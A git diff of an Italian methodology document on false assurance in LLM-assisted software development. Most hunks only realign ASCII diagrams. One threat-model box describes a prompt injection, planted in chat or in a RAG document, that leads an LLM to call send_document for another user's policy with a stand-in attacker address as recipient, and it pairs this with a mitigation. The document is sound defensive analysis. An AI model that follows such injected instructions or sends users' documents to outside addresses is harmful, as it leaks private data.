@@ -1818,15 +1818,15 @@ In base a STAMP:
 
 ```text
        +---------------------------------------------+
-       |             CONTROLLORE (Software / LLM)     |
+       |             CONTROLLORE (Software / LLM)    |
        |  Modello Interno del Processo (Mental Model)|
        +---------------------------------------------+
                    |                      ^
    Azione di       |                      | Segnali di Ritorno
    Controllo       v                      | (Feedback / Telemetria)
        +---------------------------------------------+
-       |             PROCESSO CONTROLLATO             |
-       |            (Mondo Reale / Attuatori)         |
+       |             PROCESSO CONTROLLATO            |
+       |            (Mondo Reale / Attuatori)        |
        +---------------------------------------------+
 ```
 
@@ -3072,7 +3072,7 @@ Formalmente la procedura risulta adempiuta, ma dal punto di vista dell'assurance
    +-------------------------------------------------------------+
    | LLM: Genera un documento tecnico con tono autorevole        |
    | "Tutti i requisiti di sicurezza risultano pienamente        |
-   |  soddisfatti conformemente agli standard internazionali."  |
+   |  soddisfatti conformemente agli standard internazionali."   |
    +-------------------------------------------------------------+
                                   |
                                   v
@@ -3092,8 +3092,8 @@ Formalmente la procedura risulta adempiuta, ma dal punto di vista dell'assurance
                                   v
    +-------------------------------------------------------------+
    | ESITO: FALLIMENTO DELLA GOVERNANCE                          |
-   | L'autorità decisionale è stata surrettiziamente trasferita |
-   | a un generatore probabilistico privo di competenza ontologica.|
+   | L'autorità decisionale è stata surrettiziamente trasferita  |
+   |a un generatore probabilistico privo di competenza ontologica|
    +-------------------------------------------------------------+
 ```
 
@@ -4974,7 +4974,7 @@ def test_calculate_remaining_days():
      | ESECUZIONE TEST: PASS (100%)        |
      | FALSA ASSURANCE:                    |
      | Negli anni bisestili il calcolo     |
-     | contabile e errato per tutti i     |
+     | contabile e errato per tutti i      |
      | contratti stipulati dopo il 28 Feb! |
      +-------------------------------------+
 ```
@@ -8916,13 +8916,13 @@ Nello STEP 10, la falsa assurance si crea attraverso uno schema cognitivo e proc
 +-------------------------------------------------------------------------+
 |                  IL CIRCUITO DELLA FALSA ASSURANCE                      |
 |                                                                         |
-| 1. Richiesta a LLM: "Valuta il livello di rischio e genera la suite"   |
+| 1. Richiesta a LLM: "Valuta il livello di rischio e genera la suite"    |
 |                                 |                                       |
 |                                 v                                       |
 | 2. LLM produce codice + specifica + test unitari coerenti tra loro      |
 |                                 |                                       |
 |                                 v                                       |
-| 3. La suite di test viene eseguita nella pipeline CI e ha successo     |
+| 3. La suite di test viene eseguita nella pipeline CI e ha successo      |
 |    Risultato: PASS (100% coverage, 0 fallimenti)                        |
 |                                 |                                       |
 |                                 v                                       |
@@ -8930,7 +8930,7 @@ Nello STEP 10, la falsa assurance si crea attraverso uno schema cognitivo e proc
 |    il raggiungimento di un Assurance Level elevato"                     |
 |                                 |                                       |
 |                                 v                                       |
-| 5. REALTA' EPISTEMICA: Nessun controllo indipendente è avvenuto.       |
+| 5. REALTA' EPISTEMICA: Nessun controllo indipendente è avvenuto.        |
 |    L'oracolo era circolare e condivideva le allucinazioni del codice.   |
 +-------------------------------------------------------------------------+
 ```
@@ -9676,9 +9676,9 @@ La falsa sensazione di sicurezza giustificata (False Assurance) si radica profon
 |                           |                                             |
 |                           v                                             |
 |  6. IL COLLASSO EPISTEMICO:                                             |
-|     Il team osserva '100% Test Passati' e '100% Coverage' e deduce     |
+|     Il team osserva '100% Test Passati' e '100% Coverage' e deduce      |
 |     erroneamente che l'Assurance Level raggiunto sia elevato (AL-2).    |
-|     In realta', la capacita' di rilevazione del difetto è ZERO.       |
+|     In realta', la capacita' di rilevazione del difetto è ZERO.         |
 +-------------------------------------------------------------------------+
 ```
 
@@ -10309,7 +10309,7 @@ Il meccanismo attraverso cui le assunzioni non verificate generano False Assuran
 |              IL CIRCUITO DELLA FALSA ASSURANCE SULLE ASSUNZIONI         |
 |                                                                         |
 |  1. LLM genera codice I basandosi sull'assunzione implicita A           |
-|     (es. "L'ID utente nel JWT è sempre una stringa UUID valida")       |
+|     (es. "L'ID utente nel JWT è sempre una stringa UUID valida")        |
 |                                 |                                       |
 |                                 v                                       |
 |  2. LLM genera test T creando fixture che rispettano rigorosamente A    |
@@ -10319,7 +10319,7 @@ Il meccanismo attraverso cui le assunzioni non verificate generano False Assuran
 |  3. La pipeline esegue i test T: Tutti passano (100% PASS)              |
 |                                 |                                       |
 |                                 v                                       |
-|  4. L'ingegnere conclude: "Il componente è sicuro e conforme"          |
+|  4. L'ingegnere conclude: "Il componente è sicuro e conforme"           |
 |                                 |                                       |
 |                                 v                                       |
 |  5. REALTA' OPERATIVA:                                                  |
@@ -12208,7 +12208,7 @@ Un'evidenza di avvenuto contenimento è valida **solo se raccolta attraverso un 
 |                                                                              |
 |  [ Ambiente Host / Kernel / Monitor di Sistema ]                             |
 |       ^                                                                      |
-|       | Emette evidenza oggettiva (Log di audit del kernel, rifiuto pacchetti)|
+|       |Emette evidenza oggettiva (Log di audit del kernel, rifiuto pacchetti)|
 |       |                                                                      |
 |  +----+---------------------------------------------------------------+      |
 |  |    | CANALE DI CONTENIMENTO (Sandbox)                              |      |
@@ -12219,7 +12219,7 @@ Un'evidenza di avvenuto contenimento è valida **solo se raccolta attraverso un 
 |  |       x ERRORE KERNEL: Operation not permitted                     |      |
 |  +--------------------------------------------------------------------+      |
 |                                                                              |
-|  L'evidenza valida risiede nei log dell'Host, NON nelle dichiarazioni         |
+|  L'evidenza valida risiede nei log dell'Host, NON nelle dichiarazioni        |
 |  o nei return-code gestiti internamente dal codice del processo.             |
 +------------------------------------------------------------------------------+
 ```
@@ -12551,10 +12551,10 @@ Da questo fatto epistemico derivano tre implicazioni dirette:
    +-------------------------------------------------------------+
                                  |
                                  v
-   +-------------------------------------------------------------+
-   | 4. AUDIT CRITICO UMANO (Ispezione del codice e tracciabilità)|
-   |    Verifica che non esista codice fantasma o rami non gestiti|
-   +-------------------------------------------------------------+
+  +--------------------------------------------------------------+
+  | 4. AUDIT CRITICO UMANO (Ispezione del codice e tracciabilità)|
+  |    Verifica che non esista codice fantasma o rami non gestiti|
+  +--------------------------------------------------------------+
 ```
 
 ---
@@ -14539,7 +14539,7 @@ L'utente lancia uno scanner sul working tree corrente e ottiene zero allarmi.
 ```text
                   CRONOLOGIA DEL VERSION CONTROL (GIT)
 +------------------------+       +------------------------+
-| COMMIT N-1 (Esposizione)| ----> | COMMIT N (Apparente fix)|
+|COMMIT N-1 (Esposizione)| ----> |COMMIT N (Apparente fix)|
 | File credentials.env   |       | "git rm" del file      |
 | API_SECRET = sk_live.. |       | Nessun segreto visibile|
 +------------------------+       +------------------------+
@@ -14794,8 +14794,8 @@ Lo Step 17 si posiziona come giunto fondamentale tra la generazione del codice e
 |   e la mappa delle superfici di attacco scansionate per simulare attacchi.  |
 | - Step 22 (Discrepancy Analysis): interviene quando emergono divergenze     |
 |   tra evidenze statiche (PASS SAST) e comportamenti dinamici anomali.       |
-| - Step 23 (Evidence-Based Decision Gates): raccoglie i log deterministici  |
-|   dello Step 17 come prerequisiti formali vincolanti per il deployment.    |
+| - Step 23 (Evidence-Based Decision Gates): raccoglie i log deterministicin  |
+|   dello Step 17 come prerequisiti formali vincolanti per il deployment.     |
 +-----------------------------------------------------------------------------+
 ```
 
@@ -15689,7 +15689,7 @@ Quando si sviluppa software con Large Language Models, il PBT e il Fuzzing sono 
 |    assert parse_jwt(token_with_none_alg)['valid'] == True                   |
 |          |                                                                  |
 |          v                                                                  |
-|  [ Esecuzione PBT: 10.000 esecuzioni ] -> VERDETTO: PASS                   |
+|  [ Esecuzione PBT: 10.000 esecuzioni ] -> VERDETTO: PASS                    |
 |          |                                                                  |
 |          v                                                                  |
 |  [ Falsa Certezza ]:                                                        |
@@ -16233,21 +16233,21 @@ DIAGRAMMA DEI FLUSSI (DFD) E CONFINI DI FIDUCIA:
 | Categoria: SPOOFING / ELEVATION OF PRIVILEGE                                  |
 | Elemento: Flusso 4 -> Confine 3                                               |
 | Minaccia: L'LLM, manipolato da un prompt malevolo presente nella chat o nel   |
-| documento RAG, genera: send_document(doc_id="POLIZZA_ALTRO_UTENTE",          |
+| documento RAG, genera: send_document(doc_id="POLIZZA_ALTRO_UTENTE",           |
 | recipient="hacker@external.com").                                             |
 | Mitigazione Architetturale Necessaria:                                        |
-| Il Dispatcher (L=2) non deve accettare il parametro 'recipient' dall'LLM!    |
+| Il Dispatcher (L=2) non deve accettare il parametro 'recipient' dall'LLM!     |
 | L'indirizzo email di destinazione deve essere recuperato tassativamente dalla |
-| sessione utente autenticata gestita dall'API Gateway. Il doc_id deve essere  |
+| sessione utente autenticata gestita dall'API Gateway. Il doc_id deve essere   |
 | verificato contro l'Access Control List (ACL) dell'utente chiamante.          |
 +-------------------------------------------------------------------------------+
 | Categoria: INFORMATION DISCLOSURE                                             |
 | Elemento: Vector DB -> Orchestratore RAG                                      |
 | Minaccia: Cross-Tenant Data Leak. L'utente formula una query che recupera     |
-| documenti sanitari o finanziari appartenenti ad altri assicurati.            |
+| documenti sanitari o finanziari appartenenti ad altri assicurati.             |
 | Mitigazione Architetturale Necessaria:                                        |
-| Hard-filtering sui metadati a monte della ricerca vettoriale:                |
-| WHERE tenant_id == session.tenant_id AND user_id == session.user_id.         |
+| Hard-filtering sui metadati a monte della ricerca vettoriale:                 |
+| WHERE tenant_id == session.tenant_id AND user_id == session.user_id.          |
 | Nessun documento estraneo deve comparire nel contesto fornito all'LLM.        |
 +-------------------------------------------------------------------------------+
 ```
@@ -17122,7 +17122,7 @@ La creazione di pipeline complesse composte da molteplici agenti AI (es. Agente 
 |          v                                                                  |
 |  LA REALTÀ EPISTEMICA:                                                      |
 |  Nessuno dei tre agenti possiede comprensione della semantica del database  |
-|  o dei confini di memoria. Hanno generato una catena di plausibilità       |
+|  o dei confini di memoria. Hanno generato una catena di plausibilità        |
 |  linguistica circolare. La SQL Injection rimane presente ed eseguibile.     |
 +-----------------------------------------------------------------------------+
 ```
@@ -17787,12 +17787,12 @@ Uno degli errori epistemici più ricorrenti tra chi sviluppa con LLM consiste ne
 |  "Ho generato la funzione di cifratura nella Sessione 1.                    |
 |  Ora apro la Sessione 2, completamente vuota, incollo il codice e scrivo:   |
 |  'Agisci come auditor di sicurezza indipendente. Trova tutti i bug'.        |
-|  Poiché non c'è memoria della sessione precedente, questa è una verifica     |
+|  Poiché non c'è memoria della sessione precedente, questa è una verifica    |
 |  indipendente a tutti gli effetti."                                         |
 |          |                                                                  |
 |          v                                                                  |
 |  LA REALTÀ EPISTEMICA:                                                      |
-|  - I due contesti poggiano sui medesimi pesi probabilistici e bias.        |
+|  - I due contesti poggiano sui medesimi pesi probabilistici e bias.         |
 |  - L'input fornito è il CODICE IMPLEMENTATO: il modello viene immediatamente|
 |    ancorato alla struttura sintattica esistente.                            |
 |  - Non esiste alcuna autorità qualificata responsabile dell'esito.          |
@@ -18118,13 +18118,13 @@ IL FLUSSO DI GESTIONE DELLA DISCREPANZA:
                                     v
 +-------------------------------------------------------------------------+
 | 2. REGISTRAZIONE (Logging): Creazione del Discrepancy Record            |
-|    (input minimizzato, comportamento atteso, comportamento osservato).   |
+|    (input minimizzato, comportamento atteso, comportamento osservato).  |
 +-------------------------------------------------------------------------+
                                     |
                                     v
 +-------------------------------------------------------------------------+
 | 3. TRIAGE E CLASSIFICAZIONE: Prima attribuzione di severità e origine   |
-|    (Codice, Specifica, Oracolo, Ambiente).                             |
+|    (Codice, Specifica, Oracolo, Ambiente).                              |
 +-------------------------------------------------------------------------+
                                     |
                                     v
@@ -18502,7 +18502,7 @@ Questo innesca un forte **Automation Bias**: l'analista tende a fidarsi della na
 |          |                                                                  |
 |          v                                                                  |
 |  [ LLM genera spiegazione convincente ]:                                    |
-|  "L'errore è dovuto al disallineamento dell'orologio NTP nel container di  |
+|  "L'errore è dovuto al disallineamento dell'orologio NTP nel container di   |
 |  staging, che fa apparire il token JWT gia' scaduto."                       |
 |          |                                                                  |
 |          v                                                                  |
@@ -19614,8 +19614,8 @@ Il Decision Gate Basato sull'Evidenza si colloca nel punto di snodo cruciale tra
 
 ```text
 [Step 6: Invarianti]  [Step 10: AL]  [Step 11 & 21: Oracoli]  [Step 22: Discrepanze]
-         \                  |                  |                     /
-          \                 |                  |                    /
+         \                   |                  |                     /
+          \                  |                  |                    /
            v                 v                  v                   v
         +---------------------------------------------------------------+
         |        STEP 23: EVIDENCE-BASED DECISION GATES                 |
@@ -21248,11 +21248,11 @@ Lo Step 25 costituisce la cerniera operativa tra l'approvazione formale e la gov
                  +----------------------+----------------------+
                  | Flussi telemetrici                         | Condizioni di allarme
                  v                                            v
-    +-------------------------+                  +-------------------------+
-    | STEP 26: OBSERVABILITY  |                  | STEP 27: ALERTING       |
+    +--------------------------+                 +-------------------------+
+    | STEP 26: OBSERVABILITY   |                 | STEP 27: ALERTING       |
     | Analisi degli scostamenti|                 | & RUNBOOKS              |
-    | rispetto alla baseline  |                  | Rilevamento violazioni  |
-    +-------------------------+                  +-------------------------+
+    | rispetto alla baseline   |                 | Rilevamento violazioni  |
+    +--------------------------+                 +-------------------------+
                  |                                            |
                  +----------------------+---------------------+
                                         |
@@ -22510,9 +22510,9 @@ Nel settore dell'ingegneria del software e dell'amministrazione dei sistemi non 
 Un'architettura robusta non collega mai direttamente la condizione di errore all'azione di modifica del sistema. Essa disarticola il ciclo di vita dell'allarme in cinque fasi distinte:
 
 ```text
-+---------------+     +--------------------+     +------------------------+
-| 1. RILEVAZIONE| → | 2. CLASSIFICAZIONE | → | 3. NOTIFICA/ESCALATION |
-+---------------+     +--------------------+     +------------------------+
++---------------+    +--------------------+    +------------------------+
+| 1. RILEVAZIONE| -> | 2. CLASSIFICAZIONE | -> | 3. NOTIFICA/ESCALATION |
++---------------+    +--------------------+    +------------------------+
                                                               |
                                                               v
 +---------------+                                +------------------------+
@@ -24863,9 +24863,9 @@ PATOLOGIE EPISTEMICHE NELL'ANALISI POST-DEPLOYMENT ASSISTITA DA LLM
   (Formulazione Prompt con log parziali)
                |
                v
-+---------------------------------------------------------------------+
-| LLM genera una spiegazione plausibile e una patch immediata          |
-+---------------------------------------------------------------------+
++--------------------------------------------------------------+
+| LLM genera una spiegazione plausibile e una patch immediata  |
++--------------------------------------------------------------+
                |
                +-----------------------------------+
                |                                   |
@@ -26771,19 +26771,19 @@ La Change Impact Analysis si sviluppa formalmente su quattro dimensioni analitic
 [Modifica Proposta]
         |
         v
-+-------------------------------+
++--------------------------------+
 |  1. Analisi Sintattica         | → Quali file, funzioni e token sono cambiati?
-+-------------------------------+
++--------------------------------+
         |
         v
-+-------------------------------+
++--------------------------------+
 |  2. Analisi Semantica          | → Quali contratti, stati e flussi sono variati?
-+-------------------------------+
++--------------------------------+
         |
         v
-+-------------------------------+
++--------------------------------+
 |  3. Analisi Architetturale     | → Quali altri componenti dipendono da questo?
-+-------------------------------+
++--------------------------------+
         |
         v
 +------------------------------------+
@@ -27097,13 +27097,13 @@ Trattare la modifica di un prompt come una "variazione a impatto zero" costituis
 +--------------------------------------------------------------------------+
 |                  ANTI-PATTERN: PROMPT CIA AMNESIA                        |
 |                                                                          |
-|   Modifica del Prompt: "Sii più sintetico nell'output"                  |
+|   Modifica del Prompt: "Sii più sintetico nell'output"                   |
 |          |                                                               |
 |          v                                                               |
 |   L'LLM omette campi secondari nell'oggetto JSON di risposta             |
 |          |                                                               |
 |          v                                                               |
-|   Il parser a valle fallisce con KeyError: 'metadata'                   |
+|   Il parser a valle fallisce con KeyError: 'metadata'                    |
 |          |                                                               |
 |          v                                                               |
 |   BLAST RADIUS REALE = Interruzione dell'intera pipeline di ingestione   |
@@ -27886,7 +27886,7 @@ Mantenere inalterati per mesi o anni i dataset di prova e i mock dei servizi est
 |   Esito del Test: PASS (100% successo apparente)                         |
 |          |                                                               |
 |          v                                                               |
-|   Mondo Reale: L'API reale ha mutato quote, formati e policy di rate limit|
+|  Mondo Reale: L'API reale ha mutato quote, formati e policy di rate limit|
 |          |                                                               |
 |          v                                                               |
 |   STATO REALE: Il sistema fallira' al primo disallineamento operativo    |
